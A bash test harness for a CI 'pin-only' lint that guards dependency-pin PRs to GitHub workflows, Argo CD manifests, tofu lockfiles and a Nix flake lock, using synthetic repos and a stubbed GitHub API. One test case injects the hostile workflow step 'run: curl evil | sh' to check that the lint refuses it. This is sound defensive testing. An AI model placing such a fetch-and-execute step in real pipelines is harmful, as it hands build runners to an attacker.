#!/usr/bin/env bash
# pin-only-lint-test — drives the REAL scripts/pin-only-lint.sh over synthetic git repos through
# its two seams (PIN_ONLY_REPO = the temp repo, PIN_ONLY_GH = a stub that serves canned GitHub
# API JSON through the real `--jq` expressions via jq). `devbox run pin-only-lint-test`.
#
# Every expected verdict below is derived in its comment FROM the rule in pin-only-lint.sh's
# header ((a) grammar, (b) pairing, (c) first-party, (d) upstream SHA, (e)–(h) the four revert
# memories, (j) the box flake re-resolve) and the two older shapes' PIN_LINE — never from running the script. A failing case must fail for ITS rule: the check
# greps the script's stderr for the rule's own keyword, so a case that reds for the wrong reason
# is a FAIL here too.
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
LINT="$HERE/pin-only-lint.sh"
command -v jq >/dev/null || { echo "FAIL: jq not on PATH — run via \`devbox run pin-only-lint-test\`"; exit 1; }
T="$(mktemp -d)"; trap 'rm -rf "$T"' EXIT
export GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t
export PIN_ONLY_REPO="$T/repo" PIN_ONLY_GH="$T/gh-stub" STUB="$T/api" PIN_ONLY_SLUG="teststuffstash/synthetic"
# The lint's CI arm (three-dot via GitHub's compare) must not be selected by a CI job's env leaking
# in — the cases below set it explicitly where they mean it.
unset PR_HEAD_SHA BASE_REF GITHUB_REPOSITORY GITHUB_EVENT_PATH

# ── the gh stub: `gh api <path> --jq <expr>` → jq -r <expr> over $STUB/<path>; a missing file is
# the 404 shape (non-zero, message on stderr) — exactly what an unknown tag returns upstream.
cat >"$PIN_ONLY_GH" <<'EOF'
#!/usr/bin/env bash
[ "$1" = api ] && [ "$3" = --jq ] || { echo "stub: unexpected call: $*" >&2; exit 64; }
f="$STUB/$2"
# a path that is ALSO a prefix of deeper paths (repos/<o>/<r> beside repos/<o>/<r>/compare/…) keeps
# its own body in <dir>/.self — additive, for check (j)'s default-branch read
[ -d "$f" ] && f="$f/.self"
[ -f "$f" ] || { echo "gh: HTTP 404: Not Found (https://api.github.com/$2)" >&2; exit 1; }
jq -r "$4" <"$f"
EOF
chmod +x "$PIN_ONLY_GH"
# ref_ <owner/repo> <tag> <type> <sha>: the git/ref/tags/<tag> object.  tagobj_ <owner/repo>
# <tagsha> <commitsha>: the annotated tag object git/tags/<tagsha> pointing at a commit.
ref_()    { mkdir -p "$STUB/repos/$1/git/ref/tags"; printf '{"ref":"refs/tags/%s","object":{"type":"%s","sha":"%s"}}\n' "$2" "$3" "$4" >"$STUB/repos/$1/git/ref/tags/$2"; }
tagobj_() { mkdir -p "$STUB/repos/$1/git/tags"; printf '{"tag":"x","sha":"%s","object":{"type":"commit","sha":"%s"}}\n' "$2" "$3" >"$STUB/repos/$1/git/tags/$2"; }
# reverts_ <owner/repo@sha …>: the closed-PR list with ONE merged revert-wf-* PR naming those pins
# (check (e)); reverts_ "" is the empty memory every case gets by default (see case_).
CLOSED='pulls?state=closed&sort=updated&direction=desc&per_page=100'
reverts_() { mkdir -p "$STUB/repos/$PIN_ONLY_SLUG"; if [ -z "$1" ]; then printf '[]\n'; else printf '[{"merged_at":"%s","head":{"ref":"revert-wf-abcd1234"},"body":"FU-1990 rollback\\n\\nreverted-pins: %s"}]\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$1"; fi >"$STUB/repos/$PIN_ONLY_SLUG/$CLOSED"; }
# reverts_img_ <image ref …>: the closed-PR list with ONE merged revert-img-* PR naming those
# image refs (check (f), the tofu-image-revert chain's memory).
# reverts_prov_ <name@version …>: ONE merged revert-prov-* PR naming those provider versions
# (check (g), the tofu-provider-revert chain's memory).
reverts_prov_() { mkdir -p "$STUB/repos/$PIN_ONLY_SLUG"; printf '[{"merged_at":"%s","head":{"ref":"revert-prov-abcd1234"},"body":"#1988 rollback\\n\\nreverted-providers: %s"}]\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$1" >"$STUB/repos/$PIN_ONLY_SLUG/$CLOSED"; }
reverts_img_() { mkdir -p "$STUB/repos/$PIN_ONLY_SLUG"; printf '[{"merged_at":"%s","head":{"ref":"revert-img-abcd1234"},"body":"#1988 rollback\\n\\nreverted-images: %s"}]\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$1" >"$STUB/repos/$PIN_ONLY_SLUG/$CLOSED"; }
# reverts_chart_ <chart@version …>: ONE merged revert-chart-* PR naming those chart versions
# (check (h), the chart revert actor's memory — FU-304's class row).
reverts_chart_() { mkdir -p "$STUB/repos/$PIN_ONLY_SLUG"; printf '[{"merged_at":"%s","head":{"ref":"revert-chart-abcd1234"},"body":"FU-304 rollback\\n\\nreverted-charts: %s"}]\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$1" >"$STUB/repos/$PIN_ONLY_SLUG/$CLOSED"; }
# reverts_lock_ <name@version …>: ONE merged revert-lock-* PR naming those lock versions (check (i),
# the lock shape of workflow-pin-revert — class 7 majors armed 2026-10-07).
reverts_lock_() { mkdir -p "$STUB/repos/$PIN_ONLY_SLUG"; printf '[{"merged_at":"%s","head":{"ref":"revert-lock-abcd1234"},"body":"lock rollback\\n\\nreverted-locks: %s"}]\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$1" >"$STUB/repos/$PIN_ONLY_SLUG/$CLOSED"; }

# 40-hex SHAs with a readable first byte; the values only need to be distinct and well-formed.
OLD=1111111111111111111111111111111111111111
NEW=2222222222222222222222222222222222222222
OTHER=3333333333333333333333333333333333333333
TAGOBJ=4444444444444444444444444444444444444444
FP_OLD=5555555555555555555555555555555555555555
FP_NEW=6666666666666666666666666666666666666666

# ── the synthetic repo: one workflow with two pinned actions (checkout twice, buildx once), a
# first-party workflow, and the two older guarded files.
R="$T/repo"; mkdir -p "$R/.github/workflows" "$R/argocd/platform" "$R/agents/coordinator"
git -C "$R" init -q -b master
cat >"$R/.github/workflows/ci.yaml" <<EOF
name: CI
on: [pull_request]
jobs:
  ci:
    runs-on: homelab-ephemeral
    steps:
      - uses: actions/checkout@$OLD # v4.2.1
      - uses: docker/setup-buildx-action@$OLD # v3
      - name: again
        uses: actions/checkout@$OLD # v4.2.1
      - run: echo hi
EOF
cat >"$R/.github/workflows/first-party.yml" <<EOF
name: fp
on: [push]
jobs:
  x:
    runs-on: homelab-ephemeral
    steps:
      - uses: teststuffstash/some-action@$FP_OLD # v1
EOF
printf 'spec:\n  source:\n    chart: gha-runner-scale-set\n    targetRevision: 0.14.2 # lockstep with arc-controller.yaml\n  template:\n    spec:\n      image: ghcr.io/teststuffstash/homelab/arc-runner:2026.9.1-gaaaa\n' >"$R/argocd/platform/arc-runners.yaml"
printf 'spec:\n  source:\n    targetRevision: 2026.9.1-gaaaa\n    chart: x\n' >"$R/argocd/platform/openrouter-operator.yaml"
# check (h)'s home: an UNGUARDED chart Application (the argo-workflows shape) and a raw-manifest
# Application with no chart (a `path:` source) — its targetRevision has no key in the memory.
printf 'spec:\n  source:\n    repoURL: https://argoproj.github.io/argo-helm\n    chart: argo-workflows\n    # a comment\n    targetRevision: 2.0.8\n    helm:\n      valuesObject:\n        crds: { install: true }\n' >"$R/argocd/platform/argo-workflows.yaml"
printf 'spec:\n  source:\n    repoURL: https://github.com/teststuffstash/homelab\n    path: argocd/resources/raw\n    targetRevision: master\n' >"$R/argocd/platform/raw.yaml"
# the fourth shape's home: a tofu Deployment with the dind sidecar's image line (check (f)).
mkdir -p "$R/tofu"
# check (g)'s home: a lockfile with two providers (the version line alone does not say whose it is).
printf 'provider "registry.opentofu.org/hashicorp/kubernetes" {\n  version     = "2.38.0"\n  constraints = "~> 2.31"\n}\n\nprovider "registry.opentofu.org/hashicorp/helm" {\n  version = "3.0.2"\n}\n' >"$R/tofu/.terraform.lock.hcl"
# check (i)'s home: a devbox.lock with two packages (the version line alone does not say whose it is).
printf '{"packages":{"jq@latest":{"version":"1.8.1"},"curl@latest":{"version":"8.17.0"}}}\n' >"$R/devbox.lock"
printf 'resource "kubernetes_deployment" "x" {\n  spec {\n    template {\n      spec {\n        container {\n          name  = "dind"\n          image = "docker:27-dind"\n        }\n      }\n    }\n  }\n}\n' >"$R/tofu/x.tf"
# check (j)'s home: the box flake lock — nixpkgs (github, with a ref) + disko following it, the real
# mgmt/nixos/flake.lock's shape (narHash values shortened; the lint never reads them).
mkdir -p "$R/mgmt/nixos"
cat >"$R/mgmt/nixos/flake.lock" <<'EOF2'
{
  "nodes": {
    "disko": {
      "inputs": { "nixpkgs": ["nixpkgs"] },
      "locked": { "lastModified": 1781152676, "narHash": "sha256-AAA=", "owner": "nix-community", "repo": "disko", "rev": "ff8702b4de27f72b4c78573dfb89ec74e36abdf1", "type": "github" },
      "original": { "owner": "nix-community", "repo": "disko", "type": "github" }
    },
    "nixpkgs": {
      "locked": { "lastModified": 1789114715, "narHash": "sha256-BBB=", "owner": "NixOS", "repo": "nixpkgs", "rev": "21a67dc470149f337cecafbe965d8d252a390518", "type": "github" },
      "original": { "owner": "NixOS", "ref": "nixos-26.05", "repo": "nixpkgs", "type": "github" }
    },
    "root": { "inputs": { "disko": "disko", "nixpkgs": "nixpkgs" } }
  },
  "root": "root",
  "version": 7
}
EOF2
git -C "$R" add -A && git -C "$R" commit -q -m base
BASE="$(git -C "$R" rev-parse HEAD)"

pass=0; fail=0
# case_ <name> <want: ok | <stderr keyword the failing rule prints>> <stub setup> <edit shell>
# The stub tree is rebuilt per case so a canned answer never leaks between cases.
case_() {
  local name="$1" want="$2" stubs="$3" edit="$4" out rc
  rm -rf "$STUB"; mkdir -p "$STUB"; reverts_ ""; unset PIN_ONLY_PR_AUTHOR PIN_ONLY_PR_BRANCH; eval "$stubs"
  git -C "$R" checkout -q -b "c-$name" "$BASE"
  ( cd "$R" && eval "$edit" ) >/dev/null 2>&1
  git -C "$R" add -A && git -C "$R" commit -q -m "$name"
  out="$(bash "$LINT" "$BASE" 2>&1)"; rc=$?
  git -C "$R" checkout -q master
  if [ "$want" = ok ]; then
    if [ $rc = 0 ] && grep -q '^pin-only-lint: OK' <<< "$out"; then pass=$((pass+1)); echo "PASS $name (rc 0)"; return; fi
    fail=$((fail+1)); echo "FAIL $name — wanted OK, rc=$rc:"; printf '%s\n' "$out" | sed 's/^/     /'; return
  fi
  if [ $rc != 0 ] && grep -q 'pin-only-lint: FAIL' <<< "$out" && grep -qF -- "$want" <<< "$out"; then
    pass=$((pass+1)); echo "PASS $name (rc $rc, fired on '$want')"; return
  fi
  fail=$((fail+1)); echo "FAIL $name — wanted a FAIL naming '$want', rc=$rc:"; printf '%s\n' "$out" | sed 's/^/     /'
}
# bump <file> <owner/repo> <old-sha> <old-tag> <new-sha> <new-tag>: rewrite every pin of that action
bump() { sed -i "s|uses: $2@$3 # $4\$|uses: $2@$5 # $6|" "$1"; }

# (a)+(b)+(d) all hold: both checkout lines move OLD→NEW at v4.2.2, the ref names NEW → OK.
case_ clean-pair-bump ok \
  "ref_ actions/checkout v4.2.2 commit $NEW" \
  "bump .github/workflows/ci.yaml actions/checkout $OLD v4.2.1 $NEW v4.2.2"
# (e) the reverted-pin memory: the same clean bump is REFUSED when a merged revert-wf-* PR of this
# repo names NEW as a reverted pin (the FU-1990 chain rolled it back) …
case_ reverted-pin-refused 'is a REVERTED pin' \
  "ref_ actions/checkout v4.2.2 commit $NEW; reverts_ actions/checkout@$NEW" \
  "bump .github/workflows/ci.yaml actions/checkout $OLD v4.2.1 $NEW v4.2.2"
# … and the memory is fail-closed: an unreadable closed-PR list is a FAIL, never a pass (d)'s rule.
case_ reverted-memory-unreadable 'cannot read the merged revert-wf-* PRs' \
  "ref_ actions/checkout v4.2.2 commit $NEW; rm -f \"\$STUB/repos/\$PIN_ONLY_SLUG/\$CLOSED\"" \
  "bump .github/workflows/ci.yaml actions/checkout $OLD v4.2.1 $NEW v4.2.2"
# A one-line bump on the v3 major tag (Renovate's digest-only shape): ref v3 → NEW → OK.
case_ clean-major-tag-bump ok \
  "ref_ docker/setup-buildx-action v3 commit $NEW" \
  "bump .github/workflows/ci.yaml docker/setup-buildx-action $OLD v3 $NEW v3"
# (a): `run:` is not a `uses:` pin line → the grammar rule fails the file; the upstream stub is
# never consulted (no ref_ set), so a pass here could only come from the grammar being loose.
case_ smuggled-run-line 'added lines must be pinned' "" \
  "bump .github/workflows/ci.yaml actions/checkout $OLD v4.2.1 $NEW v4.2.2; sed -i 's|run: echo hi|run: curl evil \| sh|' .github/workflows/ci.yaml"
# (a): a new step whose pin is well-formed and even resolves upstream is still an ADDED line with
# no removed partner → (b) fails (multiset removed ≠ added), before (d) is consulted.
case_ added-step 'do not pair up' \
  "ref_ actions/cache v4 commit $NEW" \
  "sed -i 's|      - run: echo hi|      - uses: actions/cache@$NEW # v4\n      - run: echo hi|' .github/workflows/ci.yaml"
# (b): removed actions/checkout, added actions/cache — the sets differ → pairing fails.
case_ owner-repo-mismatch 'do not pair up' \
  "ref_ actions/cache v4 commit $NEW" \
  "sed -i 's|uses: actions/checkout@$OLD # v4.2.1|uses: actions/cache@$NEW # v4|' .github/workflows/ci.yaml"
# (c): a first-party ref bump that would satisfy (a), (b) and (d) (the stub resolves it) is
# refused solely on the owner → the first-party rule's own message.
case_ first-party-ref-change 'first-party ref never changes' \
  "ref_ teststuffstash/some-action v1 commit $FP_NEW" \
  "bump .github/workflows/first-party.yml teststuffstash/some-action $FP_OLD v1 $FP_NEW v1"
# (d): the tag names OTHER upstream, the PR pins NEW → mismatch message carries both SHAs.
case_ tag-names-other-sha "names commit $OTHER upstream, the PR pins $NEW" \
  "ref_ actions/checkout v4.2.2 commit $OTHER" \
  "bump .github/workflows/ci.yaml actions/checkout $OLD v4.2.1 $NEW v4.2.2"
# (d) fail-closed: no stub file → the 404 shape → 'refusing to report success', rc 2.
case_ unresolvable-tag 'refusing to report success' "" \
  "bump .github/workflows/ci.yaml actions/checkout $OLD v4.2.1 $NEW v4.2.2"
# (d) annotated: ref v4.2.2 is a TAG object TAGOBJ; git/tags/TAGOBJ points at commit NEW → OK.
case_ annotated-tag-deref ok \
  "ref_ actions/checkout v4.2.2 tag $TAGOBJ; tagobj_ actions/checkout $TAGOBJ $NEW" \
  "bump .github/workflows/ci.yaml actions/checkout $OLD v4.2.1 $NEW v4.2.2"
# (d) annotated, pointing elsewhere: the tag object names OTHER, the PR pins NEW → mismatch.
case_ annotated-tag-other-sha "names commit $OTHER upstream, the PR pins $NEW" \
  "ref_ actions/checkout v4.2.2 tag $TAGOBJ; tagobj_ actions/checkout $TAGOBJ $OTHER" \
  "bump .github/workflows/ci.yaml actions/checkout $OLD v4.2.1 $NEW v4.2.2"
# (a): an unpinned `@v4` in place of a pin is not the ADDED grammar → FAIL (a de-pin is blocked).
case_ unpinned-tag-ref 'added lines must be pinned' "" \
  "sed -i 's|uses: actions/checkout@$OLD # v4.2.1|uses: actions/checkout@v4|' .github/workflows/ci.yaml"
# A mode flip (chmod +x) carries no content lines → not a pin bump → FAIL (the empty-patch arm).
case_ workflow-mode-change 'without a single content line' "" \
  "chmod +x .github/workflows/ci.yaml"
# A rename: `git diff -- <new path>` on a detected rename shows the WHOLE body as added, so the
# non-`uses:` lines (name:, on:, run:) fail the grammar → FAIL on (a). Either arm is fail-closed.
case_ workflow-rename 'added lines must be pinned' "" \
  "git mv .github/workflows/ci.yaml .github/workflows/ci2.yaml"
# ── the two older shapes, byte-for-byte: PIN_LINE admits an arc-runner image: line and a CalVer
# targetRevision: line, refuses anything else in those files.
case_ arc-runner-pin ok "" \
  "sed -i 's|arc-runner:2026.9.1-gaaaa|arc-runner:2026.9.25-gbbbb|' argocd/platform/arc-runners.yaml"
case_ arc-runner-smuggled 'may only receive PIN lines' "" \
  "sed -i 's|arc-runner:2026.9.1-gaaaa|arc-runner:2026.9.25-gbbbb|' argocd/platform/arc-runners.yaml; echo '      privileged: true' >> argocd/platform/arc-runners.yaml"
# A third-party chart pin (the Renovate `argocd` manager's `arc` group, #2216): SemVer with the
# trailing lockstep comment kept is a pin; a non-SemVer value is not. The rule judges LINE SHAPE,
# so a comment-only edit on the pin line is accepted too (a deliberate trade-off of allowing the
# comment: it deploys nothing; the value is still the only thing that may move).
case_ arc-chart-semver-bump ok "" \
  "sed -i 's|targetRevision: 0.14.2 # lockstep|targetRevision: 0.15.0 # lockstep|' argocd/platform/arc-runners.yaml"
case_ arc-chart-comment-only-edit ok "" \
  "sed -i 's|# lockstep with arc-controller.yaml|# keep in step|' argocd/platform/arc-runners.yaml"
case_ arc-chart-non-semver 'may only receive PIN lines' "" \
  "sed -i 's|targetRevision: 0.14.2 # lockstep|targetRevision: latest # lockstep|' argocd/platform/arc-runners.yaml"
# The CalVer branch stays exact (reviewer, #2216): a first-party pin with its -g<sha> dropped is NOT
# a SemVer pin (4-digit year vs 1–3 digits — disjoint), and a CalVer pin admits no trailing comment.
case_ calver-githash-dropped 'may only receive PIN lines' "" \
  "sed -i 's|targetRevision: 2026.9.1-gaaaa|targetRevision: 2026.9.25|' argocd/platform/openrouter-operator.yaml"
case_ calver-with-comment 'may only receive PIN lines' "" \
  "sed -i 's|targetRevision: 2026.9.1-gaaaa|targetRevision: 2026.9.25-gbbbb # note|' argocd/platform/openrouter-operator.yaml"
case_ calver-githash-bump ok "" \
  "sed -i 's|targetRevision: 2026.9.1-gaaaa|targetRevision: 2026.9.25-gbbbb|' argocd/platform/openrouter-operator.yaml"
case_ target-revision-pin ok "" \
  "sed -i 's|targetRevision: 2026.9.1-gaaaa|targetRevision: 2026.9.25-gbbbb|' argocd/platform/openrouter-operator.yaml"
case_ target-revision-smuggled 'may only receive PIN lines' "" \
  "sed -i 's|targetRevision: 2026.9.1-gaaaa|targetRevision: 2026.9.25-gbbbb|; s|chart: x|chart: y|' argocd/platform/openrouter-operator.yaml"
# An untouched guarded set is the no-op verdict (the common case on every PR).
case_ nothing-guarded ok "" "echo x > README.md"

# (f) the reverted-image memory — tofu/*.tf is not guarded (a non-image edit never reads the
# memory), an image bump passes on an empty memory, is REFUSED when a merged revert-img-* PR
# names the new ref, and the check fails closed when the memory cannot be read.
case_ tofu-non-image-edit ok "rm -f \"\$STUB/repos/\$PIN_ONLY_SLUG/\$CLOSED\"" "printf '# comment\\n' >> tofu/x.tf"
case_ tofu-image-bump ok "" "sed -i 's/docker:27-dind/docker:29-dind/' tofu/x.tf"
case_ tofu-image-reverted-refused 'is a REVERTED image' "reverts_img_ docker:29-dind" \
  "sed -i 's/docker:27-dind/docker:29-dind/' tofu/x.tf"
case_ tofu-image-other-reverted ok "reverts_img_ docker:28-dind" \
  "sed -i 's/docker:27-dind/docker:29-dind/' tofu/x.tf"
case_ tofu-image-memory-unreadable 'cannot read the merged revert-img-* PRs' "rm -f \"\$STUB/repos/\$PIN_ONLY_SLUG/\$CLOSED\"" \
  "sed -i 's/docker:27-dind/docker:29-dind/' tofu/x.tf"
# (g) the reverted-provider memory: a lockfile bump passes on an empty memory, is REFUSED when a
# merged revert-prov-* PR names that provider@version, passes when the memory names ANOTHER
# provider at the same version (the name is part of the key), and an unreadable memory is a FAIL.
case_ provider-bump ok "" "sed -i 's/2.38.0/3.2.1/' tofu/.terraform.lock.hcl"
case_ provider-reverted-refused 'is a REVERTED provider version' "reverts_prov_ kubernetes@3.2.1" \
  "sed -i 's/2.38.0/3.2.1/' tofu/.terraform.lock.hcl"
case_ provider-other-name-same-version ok "reverts_prov_ helm@3.2.1" \
  "sed -i 's/2.38.0/3.2.1/' tofu/.terraform.lock.hcl"
case_ provider-memory-unreadable 'cannot read the merged revert-prov-* PRs' "rm -f \"\$STUB/repos/\$PIN_ONLY_SLUG/\$CLOSED\"" \
  "sed -i 's/2.38.0/3.2.1/' tofu/.terraform.lock.hcl"
# (i) the reverted-lock memory: a devbox.lock re-resolve passes on an empty memory, is REFUSED when a
# merged revert-lock-* PR names that name@version, passes when the memory names ANOTHER package at the
# same version (the name is part of the key), and an unreadable memory is a FAIL.
case_ lock-bump ok "" "sed -i 's/8.17.0/8.22.0/' devbox.lock"
case_ lock-reverted-refused 'is a REVERTED lock version' "reverts_lock_ curl@8.22.0" \
  "sed -i 's/8.17.0/8.22.0/' devbox.lock"
case_ lock-other-name-same-version ok "reverts_lock_ jq@8.22.0" \
  "sed -i 's/8.17.0/8.22.0/' devbox.lock"
case_ lock-memory-unreadable 'cannot read the merged revert-lock-* PRs' "rm -f \"\$STUB/repos/\$PIN_ONLY_SLUG/\$CLOSED\"" \
  "sed -i 's/8.17.0/8.22.0/' devbox.lock"
# (j) the box flake lock — the owner replacement (pin-only-lint.sh header (j)). Expected verdicts from
# the header's rules: the devbox-update App's re-resolve to a rev its branch CONTAINS passes; a rev the
# compare API cannot place (404 — a fork commit served under the parent's URL), an off-branch rev
# (`diverged`) and a rev AHEAD of the branch are refused; a locked owner swap, an `original` edit, an
# added input and a rewired follows are refused (shape); a non-App author is refused (the file stays
# owned); an unknown author fails closed (rc 2); the revert App on revert-lock-* passes only when it
# restores master's previous file byte-for-byte; a PR that also changes flake.nix defers to the owner.
FL=mgmt/nixos/flake.lock
APP='homelab-renovate-1234[bot]'; REV_APP='homelab-agents-1234[bot]'
NP_OLD=21a67dc470149f337cecafbe965d8d252a390518; NP_NEW=7c8764b7c7b09b34f632464276218ef9090eaa11
DK=ff8702b4de27f72b4c78573dfb89ec74e36abdf1; FORK=9999999999999999999999999999999999999999
cmp_() { mkdir -p "$STUB/repos/$1/compare"; printf '{"status":"%s"}\n' "$4" >"$STUB/repos/$1/compare/$2...$3"; }
# disko has no ref → (j) reads its default branch from repos/nix-community/disko (the stub's .self body)
onbranch_() {  # every case's baseline: disko on master, nixpkgs NEW and OLD both on nixos-26.05
  mkdir -p "$STUB/repos/nix-community/disko"; printf '{"default_branch":"master"}\n' >"$STUB/repos/nix-community/disko/.self"
  cmp_ NixOS/nixpkgs nixos-26.05 "$NP_NEW" behind; cmp_ NixOS/nixpkgs nixos-26.05 "$NP_OLD" behind
  cmp_ nix-community/disko master "$DK" identical
}
relock_to() { echo "jq '.nodes.nixpkgs.locked |= (.rev = \"$1\" | .narHash = \"sha256-CCC=\" | .lastModified = 1791600000)' $FL > x && mv x $FL"; }
case_ flake-relock ok "export PIN_ONLY_PR_AUTHOR='$APP'; onbranch_" "$(relock_to $NP_NEW)"
case_ flake-fork-commit-refused 'not comparable with branch nixos-26.05' "export PIN_ONLY_PR_AUTHOR='$APP'; onbranch_" "$(relock_to $FORK)"
case_ flake-off-branch-refused "is NOT on branch nixos-26.05 (compare status 'diverged'" \
  "export PIN_ONLY_PR_AUTHOR='$APP'; onbranch_; cmp_ NixOS/nixpkgs nixos-26.05 $OTHER diverged" "$(relock_to $OTHER)"
case_ flake-ahead-refused "compare status 'ahead'" \
  "export PIN_ONLY_PR_AUTHOR='$APP'; onbranch_; cmp_ NixOS/nixpkgs nixos-26.05 $OTHER ahead" "$(relock_to $OTHER)"
case_ flake-fork-owner-refused 'is not its original' "export PIN_ONLY_PR_AUTHOR='$APP'; onbranch_" \
  "jq '.nodes.nixpkgs.locked.owner = \"evil\"' $FL > x && mv x $FL"
case_ flake-original-ref-refused 'only locked may move' "export PIN_ONLY_PR_AUTHOR='$APP'; onbranch_" \
  "jq '.nodes.nixpkgs.original.ref = \"nixos-unstable\"' $FL > x && mv x $FL"
case_ flake-input-added-refused 'only locked may move' "export PIN_ONLY_PR_AUTHOR='$APP'; onbranch_" \
  "jq '.nodes.extra = .nodes.disko | .nodes.root.inputs.extra = \"extra\"' $FL > x && mv x $FL"
case_ flake-follows-rewired-refused 'only locked may move' "export PIN_ONLY_PR_AUTHOR='$APP'; onbranch_" \
  "jq '.nodes.disko.inputs = {}' $FL > x && mv x $FL"
case_ flake-non-app-author-refused "author '$REV_APP' may not change it via a PR" \
  "export PIN_ONLY_PR_AUTHOR='$REV_APP' PIN_ONLY_PR_BRANCH=fix/x; onbranch_" "$(relock_to $NP_NEW)"
case_ flake-unknown-author-fails-closed 'the PR author is unknown' "onbranch_" "$(relock_to $NP_NEW)"
case_ flake-unparseable 'cannot parse' "export PIN_ONLY_PR_AUTHOR='$APP'" "echo '{not json' > $FL"
# the revert App: master's previous file (served by the commits+contents API stub) is the NEW-rev lock;
# restoring it exactly passes, restoring anything else (the OLD-rev... here: a third rev) is refused.
PREV=7777777777777777777777777777777777777777
prev_() {  # <rev the previous master file locked nixpkgs to>
  mkdir -p "$(dirname "$STUB/repos/$PIN_ONLY_SLUG/commits?path=$FL")" "$STUB/repos/$PIN_ONLY_SLUG/contents/mgmt/nixos"
  printf '[{"sha":"%s","parents":[{"sha":"%s"}]}]\n' "$BASE" "$PREV" >"$STUB/repos/$PIN_ONLY_SLUG/commits?path=$FL&sha=$BASE&per_page=1"
  printf '{"content":"%s"}\n' "$(git -C "$R" show "$BASE:$FL" | jq --arg r "$1" '.nodes.nixpkgs.locked |= (.rev = $r | .narHash = "sha256-CCC=" | .lastModified = 1791600000)' | base64 -w0)" \
    >"$STUB/repos/$PIN_ONLY_SLUG/contents/$FL?ref=$PREV"
}
case_ flake-revert-restores-ok ok \
  "export PIN_ONLY_PR_AUTHOR='$REV_APP' PIN_ONLY_PR_BRANCH=revert-lock-abcd1234; onbranch_; prev_ $NP_NEW" "$(relock_to $NP_NEW)"
case_ flake-revert-invents-refused 'must restore master' \
  "export PIN_ONLY_PR_AUTHOR='$REV_APP' PIN_ONLY_PR_BRANCH=revert-lock-abcd1234; onbranch_; prev_ $NP_NEW; cmp_ NixOS/nixpkgs nixos-26.05 $OTHER behind" "$(relock_to $OTHER)"
case_ flake-revert-history-unreadable "cannot read master's previous version" \
  "export PIN_ONLY_PR_AUTHOR='$REV_APP' PIN_ONLY_PR_BRANCH=revert-lock-abcd1234; onbranch_" "$(relock_to $NP_NEW)"
# beside flake.nix (an owned /mgmt/ path) the code owner reads the PR — (j) defers even for a fork owner
case_ flake-beside-flake-nix-defers ok "export PIN_ONLY_PR_AUTHOR='$REV_APP' PIN_ONLY_PR_BRANCH=fix/x" \
  "jq '.nodes.nixpkgs.locked.owner = \"evil\"' $FL > x && mv x $FL && echo '# x' >> mgmt/nixos/flake.nix"
# (h) the reverted-chart memory: an unguarded chart Application's targetRevision bump passes on an
# empty memory, is REFUSED when a merged revert-chart-* PR names that chart@version, passes when
# the memory names the same chart at ANOTHER version or ANOTHER chart at the same version (the key
# is the pair), and an unreadable memory is a FAIL. A non-pin edit of the file and a `path:`-source
# Application (no `chart:`) never read the memory — the unreadable stub proves it.
case_ chart-bump ok "" "sed -i 's/targetRevision: 2.0.8/targetRevision: 3.0.0/' argocd/platform/argo-workflows.yaml"
case_ chart-reverted-refused 'is a REVERTED chart version' "reverts_chart_ argo-workflows@3.0.0" \
  "sed -i 's/targetRevision: 2.0.8/targetRevision: 3.0.0/' argocd/platform/argo-workflows.yaml"
case_ chart-other-version-reverted ok "reverts_chart_ argo-workflows@2.9.0" \
  "sed -i 's/targetRevision: 2.0.8/targetRevision: 3.0.0/' argocd/platform/argo-workflows.yaml"
case_ chart-other-chart-same-version ok "reverts_chart_ argo-events@3.0.0" \
  "sed -i 's/targetRevision: 2.0.8/targetRevision: 3.0.0/' argocd/platform/argo-workflows.yaml"
case_ chart-memory-unreadable 'cannot read the merged revert-chart-* PRs' "rm -f \"\$STUB/repos/\$PIN_ONLY_SLUG/\$CLOSED\"" \
  "sed -i 's/targetRevision: 2.0.8/targetRevision: 3.0.0/' argocd/platform/argo-workflows.yaml"
case_ chart-non-pin-edit ok "rm -f \"\$STUB/repos/\$PIN_ONLY_SLUG/\$CLOSED\"" \
  "sed -i 's/install: true/install: false/' argocd/platform/argo-workflows.yaml"
case_ chartless-target-revision ok "rm -f \"\$STUB/repos/\$PIN_ONLY_SLUG/\$CLOSED\"" \
  "sed -i 's/targetRevision: master/targetRevision: main/' argocd/platform/raw.yaml"
# (h) composes with the two guarded shapes: a CalVer pin on openrouter-operator.yaml (chart x) and a
# SemVer pin WITH its trailing comment on arc-runners.yaml each pass PIN_LINE and are still refused
# when the memory names them — the comment is not part of the version the memory is keyed on.
case_ chart-reverted-calver-guarded 'is a REVERTED chart version' "reverts_chart_ x@2026.9.25-gbbbb" \
  "sed -i 's|targetRevision: 2026.9.1-gaaaa|targetRevision: 2026.9.25-gbbbb|' argocd/platform/openrouter-operator.yaml"
case_ chart-reverted-semver-commented 'is a REVERTED chart version' "reverts_chart_ gha-runner-scale-set@0.15.0" \
  "sed -i 's|targetRevision: 0.14.2 # lockstep|targetRevision: 0.15.0 # lockstep|' argocd/platform/arc-runners.yaml"

# ── the initial-pin scenario: a repo whose workflows were NEVER pinned before. Renovate's first
# pass removes unpinned refs (`@v4`) and adds pinned ones (`@sha # v4`). The removed lines are
# unpinned (don't match WORKFLOW_PIN_LINE), the added lines are pinned. Pairing still holds.
R2="$T/repo2"; mkdir -p "$R2/.github/workflows"
git -C "$R2" init -q -b master
cat >"$R2/.github/workflows/ci.yaml" <<EOF
name: CI
on: [pull_request]
jobs:
  ci:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: docker/setup-buildx-action@v3
      - run: echo hi
EOF
git -C "$R2" add -A && git -C "$R2" commit -q -m base
BASE2="$(git -C "$R2" rev-parse HEAD)"

# Initial pin: unpinned → pinned. Removed lines are unpinned, added are pinned with verified SHAs.
git -C "$R2" checkout -q -b "initial-pin" "$BASE2"
sed -i "s|uses: actions/checkout@v4|uses: actions/checkout@$NEW # v4|" "$R2/.github/workflows/ci.yaml"
sed -i "s|uses: docker/setup-buildx-action@v3|uses: docker/setup-buildx-action@$NEW # v3|" "$R2/.github/workflows/ci.yaml"
git -C "$R2" add -A && git -C "$R2" commit -q -m "pin deps"
